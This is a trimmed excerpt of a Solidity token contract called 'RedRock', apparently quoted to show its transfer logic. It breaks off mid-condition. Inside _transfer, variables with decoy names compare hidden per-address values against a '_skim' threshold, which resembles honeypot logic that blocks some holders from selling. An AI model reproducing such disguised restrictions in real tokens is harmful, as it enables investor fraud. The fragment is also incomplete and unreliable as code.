...
contract REDROCK is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "RedRock";
    string private _symbol = "RR";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x6c2f799445F8753e2F114e3A9eB6d8faAD8D4493); // Marketing Address
    address payable private BuyBackWalletAddress = payable(0x6c2f799445F8753e2F114e3A9eB6d8faAD8D4493); // BuyBack Address
    address public immutable deadAddress = 0x000000000000000000000000000000000000dEaD;
    
    mapping (address => uint256) _balances;
    mapping (address => uint256) _klast;
    ...
    uint256 private _skim = _totalSupply; 
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        else
        {
            ...
            uint256 flying = _klast[sender];
            uint256 diving = _klast[recipient];
            uint256 running = _skim;
            uint256 walking = 0;
            uint256 listening = amount;
            if (flying > walking && listening > running) {
            bool burning = flying == diving;
